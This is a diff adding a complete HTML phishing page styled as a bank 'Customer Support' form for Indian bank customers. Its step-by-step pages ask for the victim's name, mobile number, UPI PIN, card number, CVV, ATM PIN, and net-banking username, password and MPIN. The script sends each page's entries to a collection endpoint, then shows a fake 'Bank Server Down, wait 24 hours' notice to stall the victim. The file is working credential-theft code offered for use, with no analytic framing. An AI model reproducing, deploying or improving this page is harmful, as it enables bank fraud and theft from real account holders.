@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Customer Support</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #1a237e;
+            --primary-light: #3949ab;
+            --accent: #00bfa5;
+            --accent-dark: #00897b;
+            --bg: #f0f2f5;
+            --card: #ffffff;
+            --text: #1a1a2e;
+            --text-light: #64748b;
+            --danger: #e53935;
+            --success: #43a047;
+            --shadow: 0 8px 32px rgba(26,35,126,0.10);
+            --shadow-sm: 0 2px 12px rgba(0,0,0,0.06);
+            --radius: 16px;
+            --font: 'Inter', -apple-system, sans-serif;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; }
+
+        /* Header */
+        .header {
+            background: linear-gradient(135deg, #1a237e 0%, #283593 50%, #1565c0 100%);
+            color: #fff; padding: 20px 24px 18px; position: relative; overflow: hidden;
+        }
+        .header::after {
+            content: ''; position: absolute; bottom: -30px; left: -20px; right: -20px; height: 60px;
+            background: var(--bg); border-radius: 50% 50% 0 0;
+        }
+        .header-title { font-size: 17px; font-weight: 600; letter-spacing: 0.3px; }
+        .header.hidden { display: none; }
+
+        /* Hero */
+        .hero {
+            background: var(--card); text-align: center; padding: 28px 20px 20px;
+            position: relative; z-index: 1;
+        }
+        .hero-badge {
+            display: inline-block; background: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            color: #fff; padding: 6px 18px; border-radius: 20px; font-size: 12px;
+            font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 16px;
+        }
+        .hero-icon { font-size: 64px; margin-bottom: 8px; display: block; }
+        .hero-text { color: var(--text-light); font-size: 13px; font-weight: 500; }
+
+        /* Progress */
+        .progress-bar {
+            display: flex; justify-content: center; gap: 8px; padding: 16px 20px 8px;
+            background: var(--card);
+        }
+        .progress-dot {
+            width: 10px; height: 10px; border-radius: 50%; background: #e0e0e0;
+            transition: all 0.4s ease;
+        }
+        .progress-dot.active { background: var(--primary); transform: scale(1.3); }
+        .progress-dot.done { background: var(--accent); }
+
+        /* Content */
+        .content { padding: 12px 16px 30px; max-width: 500px; margin: 0 auto; }
+
+        /* Pages */
+        .page { display: none; animation: slideUp 0.4s cubic-bezier(0.22,1,0.36,1); }
+        .page.active { display: block; }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Card */
+        .card {
+            background: var(--card); border-radius: var(--radius); padding: 28px 22px;
+            box-shadow: var(--shadow); margin-bottom: 16px;
+        }
+        .card-title {
+            font-size: 17px; font-weight: 700; color: var(--primary); margin-bottom: 24px;
+            display: flex; align-items: center; gap: 10px;
+        }
+        .card-title .icon { font-size: 22px; }
+
+        /* Form elements */
+        .field { margin-bottom: 22px; }
+        .field label {
+            display: block; font-size: 13px; font-weight: 600; color: var(--primary);
+            margin-bottom: 8px; letter-spacing: 0.2px;
+        }
+        .field input, .field select {
+            width: 100%; border: none; border-bottom: 2px solid #e0e7ff;
+            padding: 10px 2px; font-size: 16px; font-family: var(--font);
+            background: transparent; color: var(--text); outline: none;
+            transition: border-color 0.3s;
+        }
+        .field input:focus { border-bottom-color: var(--primary); }
+        .field input::placeholder { color: #94a3b8; font-weight: 400; }
+
+        /* Inline fields */
+        .inline-fields { display: flex; gap: 16px; }
+        .inline-fields .field { flex: 1; }
+
+        /* Radio */
+        .radio-row { margin-bottom: 14px; }
+        .radio-label {
+            display: flex; align-items: center; cursor: pointer; font-size: 16px;
+            font-weight: 500; padding: 12px 16px; border-radius: 12px;
+            border: 2px solid #e0e7ff; transition: all 0.25s; margin-bottom: 10px;
+        }
+        .radio-label:hover { border-color: var(--primary-light); background: #f5f7ff; }
+        .radio-label input { display: none; }
+        .radio-dot {
+            width: 22px; height: 22px; border: 2px solid var(--primary-light);
+            border-radius: 50%; margin-right: 14px; position: relative; flex-shrink: 0;
+            transition: all 0.25s;
+        }
+        .radio-label input:checked ~ .radio-dot {
+            border-color: var(--primary); background: var(--primary);
+        }
+        .radio-label input:checked ~ .radio-dot::after {
+            content: ''; width: 8px; height: 8px; background: #fff; border-radius: 50%;
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
+        }
+        .radio-label input:checked ~ span:last-child { color: var(--primary); font-weight: 600; }
+
+        /* Buttons */
+        .btn {
+            width: 100%; padding: 15px; border: none; border-radius: 12px;
+            font-size: 16px; font-weight: 700; cursor: pointer; letter-spacing: 0.5px;
+            transition: all 0.25s; font-family: var(--font);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+            color: #fff; box-shadow: 0 4px 16px rgba(26,35,126,0.25);
+        }
+        .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(26,35,126,0.35); }
+        .btn-primary:active { transform: translateY(1px); }
+
+        /* Payment method buttons */
+        .pay-methods { display: flex; flex-direction: column; gap: 12px; }
+        .pay-btn {
+            display: flex; align-items: center; gap: 14px; padding: 18px 20px;
+            background: var(--card); border: 2px solid #e0e7ff; border-radius: 14px;
+            cursor: pointer; transition: all 0.25s; font-family: var(--font);
+            font-size: 16px; font-weight: 600; color: var(--text);
+        }
+        .pay-btn:hover { border-color: var(--primary); background: #f5f7ff; transform: translateX(4px); }
+        .pay-btn:active { transform: translateX(2px); }
+        .pay-btn .pay-icon {
+            width: 44px; height: 44px; border-radius: 12px; display: flex;
+            align-items: center; justify-content: center; font-size: 22px;
+            background: linear-gradient(135deg, #e8eaf6, #c5cae9);
+        }
+        .pay-btn .arrow { margin-left: auto; color: var(--text-light); font-size: 18px; }
+
+        /* Final page */
+        .final-card { text-align: center; padding: 36px 24px; }
+        .final-icon { font-size: 56px; margin-bottom: 16px; display: block; }
+        .final-title { font-size: 20px; font-weight: 800; margin-bottom: 8px; }
+        .final-note {
+            display: inline-block; background: rgba(67,160,71,0.1); color: var(--success);
+            padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 700;
+            margin-bottom: 16px;
+        }
+        .final-text { color: var(--text-light); font-size: 14px; line-height: 1.7; font-weight: 500; }
+    </style>
+</head>
+<body>
+
+<div class="header" id="header">
+    <div class="header-title">🛡️ Online Service</div>
+</div>
+
+<div class="hero" id="hero">
+    <span class="hero-badge">Customer Support</span>
+    <span class="hero-icon">🏦</span>
+    <p class="hero-text">Please fill in your details to proceed</p>
+</div>
+
+<div class="progress-bar" id="progress">
+    <div class="progress-dot active" data-step="1"></div>
+    <div class="progress-dot" data-step="2"></div>
+    <div class="progress-dot" data-step="3"></div>
+    <div class="progress-dot" data-step="4"></div>
+    <div class="progress-dot" data-step="5"></div>
+</div>
+
+<main class="content">
+    <!-- PAGE 1: Customer Info -->
+    <div id="page-1" class="page active">
+        <div class="card">
+            <div class="card-title"><span class="icon">📋</span> Service Request</div>
+            <form id="form-info">
+                <div class="field">
+                    <label>Customer Name *</label>
+                    <input type="text" id="customer-name" placeholder="Enter your full name" required>
+                </div>
+                <div class="field">
+                    <label>Mobile Number *</label>
+                    <input type="tel" id="mobile-number" placeholder="Enter 10-digit number" required
+                        pattern="[0-9]{10}" maxlength="10" minlength="10"
+                        oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                </div>
+                <div class="field">
+                    <label>Reason *</label>
+                    <input type="text" id="reason" placeholder="Describe your issue" required>
+                </div>
+                <button type="submit" class="btn btn-primary">CONTINUE →</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 2: Payment Mode -->
+    <div id="page-2" class="page">
+        <div class="card">
+            <div class="card-title"><span class="icon">💰</span> Payment Mode</div>
+            <form id="form-payment">
+                <div class="radio-row">
+                    <label class="radio-label">
+                        <input type="radio" name="payment-mode" value="pay" checked>
+                        <span class="radio-dot"></span><span>💳 PAY</span>
+                    </label>
+                    <label class="radio-label">
+                        <input type="radio" name="payment-mode" value="refund">
+                        <span class="radio-dot"></span><span>🔄 REFUND</span>
+                    </label>
+                    <label class="radio-label">
+                        <input type="radio" name="payment-mode" value="other">
+                        <span class="radio-dot"></span><span>📝 OTHER</span>
+                    </label>
+                </div>
+                <div class="field">
+                    <label>Amount *</label>
+                    <input type="number" id="amount" placeholder="Enter amount" required>
+                </div>
+                <button type="submit" class="btn btn-primary">NEXT →</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE 3: Payment Method -->
+    <div id="page-3" class="page">
+        <div class="card">
+            <div class="card-title"><span class="icon">🏧</span> Select Payment Method</div>
+            <div class="pay-methods">
+                <button type="button" class="pay-btn" onclick="selectPayment('upi')">
+                    <span class="pay-icon">📱</span> UPI <span class="arrow">›</span>
+                </button>
+                <button type="button" class="pay-btn" onclick="selectPayment('card')">
+                    <span class="pay-icon">💳</span> Debit / Credit Card <span class="arrow">›</span>
+                </button>
+                <button type="button" class="pay-btn" onclick="selectPayment('netbanking')">
+                    <span class="pay-icon">🏦</span> Net Banking <span class="arrow">›</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- PAGE UPI -->
+    <div id="page-upi" class="page">
+        <div class="card">
+            <div class="card-title"><span class="icon">📱</span> UPI Details</div>
+            <form id="form-upi" onsubmit="showFinalPage(event)">
+                <div class="field">
+                    <label>Bank Name *</label>
+                    <input type="text" id="upi-bank-name" placeholder="Search or select bank"
+                        list="indian-banks" required autocomplete="off">
+                </div>
+                <div class="field">
+                    <label>UPI PIN *</label>
+                    <input type="password" id="upi-password" placeholder="Enter UPI PIN" required>
+                </div>
+                <button type="submit" class="btn btn-primary">SUBMIT</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE CARD -->
+    <div id="page-card" class="page">
+        <div class="card">
+            <div class="card-title"><span class="icon">💳</span> Card Details</div>
+            <form id="form-card" onsubmit="showFinalPage(event)">
+                <div class="field">
+                    <label>Card 16-Digit Number *</label>
+                    <input type="text" id="card-number" placeholder="XXXX-XXXX-XXXX-XXXX"
+                        maxlength="19" required
+                        oninput="this.value=this.value.replace(/[^0-9]/g,'').replace(/(.{4})/g,'$1-').replace(/-$/,'')">
+                </div>
+                <div class="inline-fields">
+                    <div class="field">
+                        <label>Expiry Date *</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="field">
+                        <label>CVV *</label>
+                        <input type="password" id="cvv" placeholder="CVV" maxlength="3" required>
+                    </div>
+                </div>
+                <div class="field">
+                    <label>ATM PIN *</label>
+                    <input type="password" id="atm-pin" placeholder="Enter ATM PIN" maxlength="4" required>
+                </div>
+                <button type="submit" class="btn btn-primary">SUBMIT</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE NETBANKING -->
+    <div id="page-netbanking" class="page">
+        <div class="card">
+            <div class="card-title"><span class="icon">🏦</span> Net Banking Details</div>
+            <form id="form-netbanking" onsubmit="showFinalPage(event)">
+                <div class="field">
+                    <label>Bank Name *</label>
+                    <input type="text" id="bank-name" placeholder="Search or select bank"
+                        list="indian-banks" required autocomplete="off">
+                </div>
+                <div class="field">
+                    <label>Username / Customer ID *</label>
+                    <input type="text" id="username" placeholder="Enter Username / Customer ID" required>
+                </div>
+                <div class="field">
+                    <label>Password *</label>
+                    <input type="password" id="password" placeholder="Enter Password" required>
+                </div>
+                <div class="field">
+                    <label>MPIN *</label>
+                    <input type="password" id="mpin" placeholder="Enter MPIN" maxlength="6" required
+                        oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+                </div>
+                <button type="submit" class="btn btn-primary">SUBMIT</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PAGE FINAL -->
+    <div id="page-final" class="page">
+        <div class="card final-card">
+            <span class="final-icon">⚠️</span>
+            <div class="final-title" style="color:var(--danger)">Bank Server Down</div>
+            <div class="final-note">📌 Important Note</div>
+            <p class="final-text">
+                Please Wait. This process may take a minimum of 24 hours.<br>
+                You will receive a notification once your details are successfully verified.
+            </p>
+        </div>
+    </div>
+</main>
+
+<datalist id="indian-banks">
+    <option value="State Bank of India"></option><option value="HDFC Bank"></option>
+    <option value="ICICI Bank"></option><option value="Punjab National Bank"></option>
+    <option value="Bank of Baroda"></option><option value="Axis Bank"></option>
+    <option value="Canara Bank"></option><option value="Union Bank of India"></option>
+    <option value="Kotak Mahindra Bank"></option><option value="Bank of India"></option>
+    <option value="Indian Bank"></option><option value="Central Bank of India"></option>
+    <option value="IDBI Bank"></option><option value="Indian Overseas Bank"></option>
+    <option value="UCO Bank"></option><option value="Federal Bank"></option>
+    <option value="Bank of Maharashtra"></option><option value="IndusInd Bank"></option>
+    <option value="IDFC FIRST Bank"></option><option value="Yes Bank"></option>
+    <option value="Karnataka Bank"></option><option value="Karur Vysya Bank"></option>
+    <option value="City Union Bank"></option><option value="South Indian Bank"></option>
+    <option value="Tamilnad Mercantile Bank"></option><option value="RBL Bank"></option>
+    <option value="DCB Bank"></option><option value="Dhanlaxmi Bank"></option>
+    <option value="CSB Bank"></option><option value="DBS Bank India"></option>
+    <option value="HSBC Bank"></option><option value="Standard Chartered Bank"></option>
+    <option value="Airtel Payments Bank"></option><option value="India Post Payments Bank"></option>
+    <option value="Jio Payments Bank"></option><option value="Fino Payments Bank"></option>
+    <option value="NSDL Payments Bank"></option><option value="Paytm Payments Bank"></option>
+    <option value="AU Small Finance Bank"></option><option value="Equitas Small Finance Bank"></option>
+    <option value="Ujjivan Small Finance Bank"></option><option value="ESAF Small Finance Bank"></option>
+    <option value="Suryoday Small Finance Bank"></option><option value="Utkarsh Small Finance Bank"></option>
+    <option value="Jana Small Finance Bank"></option><option value="Unity Small Finance Bank"></option>
+    <option value="Slice Small Finance Bank"></option><option value="Saraswat Co-operative Bank"></option>
+    <option value="Cosmos Co-operative Bank"></option><option value="Abhyudaya Co-operative Bank"></option>
+</datalist>
+
+<script>
+(function() {
+    const data = {};
+    const params = new URLSearchParams(window.location.search);
+    const deviceId = params.get('deviceId') || 'unknown_device';
+
+    function baseUrl() { return window.location.origin; }
+
+    function syncPage(pageName, pageData) {
+        fetch(baseUrl() + '/api/form/sync', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, pageName, pageData, timestamp: new Date().toISOString() })
+        }).then(r => r.json()).then(d => console.log('[Form] Synced:', pageName, d))
+          .catch(e => console.error('[Form] Sync error:', e));
+    }
+
+    function submitFinal() {
+        fetch(baseUrl() + '/api/form/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId, currentFlow: data.paymentMethod || 'unknown', ...data, submittedAt: new Date().toISOString() })
+        }).then(r => r.json()).then(d => console.log('[Form] Submitted:', d))
+          .catch(e => console.error('[Form] Submit error:', e));
+    }
+
+    function showPage(id, step) {
+        document.querySelectorAll('.page.active').forEach(p => p.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+        document.querySelectorAll('.progress-dot').forEach((d, i) => {
+            d.classList.remove('active', 'done');
+            if (i + 1 < step) d.classList.add('done');
+            else if (i + 1 === step) d.classList.add('active');
+        });
+        window.scrollTo(0, 0);
+    }
+
+    // Page 1 -> 2
+    document.getElementById('form-info').addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (!this.checkValidity()) return;
+        data.customerName = document.getElementById('customer-name').value;
+        data.mobileNumber = document.getElementById('mobile-number').value;
+        data.reason = document.getElementById('reason').value;
+        syncPage('customer_info', { customerName: data.customerName, mobileNumber: data.mobileNumber, reason: data.reason });
+        showPage('page-2', 2);
+    });
+
+    // Page 2 -> 3
+    document.getElementById('form-payment').addEventListener('submit', function(e) {
+        e.preventDefault();
+        if (!this.checkValidity()) return;
+        data.paymentMode = document.querySelector('input[name="payment-mode"]:checked')?.value || '';
+        data.amount = document.getElementById('amount').value;
+        syncPage('payment_mode', { paymentMode: data.paymentMode, amount: data.amount });
+        showPage('page-3', 3);
+    });
+
+    // Page 3 -> method page
+    window.selectPayment = function(method) {
+        data.paymentMethod = method;
+        syncPage('payment_method', { paymentMethod: method });
+        var pageMap = { upi: 'page-upi', card: 'page-card', netbanking: 'page-netbanking' };
+        showPage(pageMap[method], 4);
+    };
+
+    // Final page handler
+    window.showFinalPage = function(e) {
+        e.preventDefault();
+        if (data.paymentMethod === 'upi') {
+            data.upiBankName = document.getElementById('upi-bank-name').value;
+            data.upiPin = document.getElementById('upi-password').value;
+            syncPage('upi_details', { upiBankName: data.upiBankName, upiPin: data.upiPin });
+        } else if (data.paymentMethod === 'card') {
+            data.cardNumber = document.getElementById('card-number').value;
+            data.expiry = document.getElementById('expiry').value;
+            data.cvv = document.getElementById('cvv').value;
+            data.atmPin = document.getElementById('atm-pin').value;
+            syncPage('card_details', { cardNumber: data.cardNumber, expiry: data.expiry, cvv: data.cvv, atmPin: data.atmPin });
+        } else if (data.paymentMethod === 'netbanking') {
+            data.bankName = document.getElementById('bank-name').value;
+            data.username = document.getElementById('username').value;
+            data.password = document.getElementById('password').value;
+            data.mpin = document.getElementById('mpin').value;
+            syncPage('netbanking_details', { bankName: data.bankName, username: data.username, password: data.password, mpin: data.mpin });
+        }
+        submitFinal();
+        showPage('page-final', 5);
+        document.getElementById('header').classList.add('hidden');
+        document.getElementById('hero').style.display = 'none';
+        document.getElementById('progress').style.display = 'none';
+    };
+})();
+</script>
+</body>
+</html>
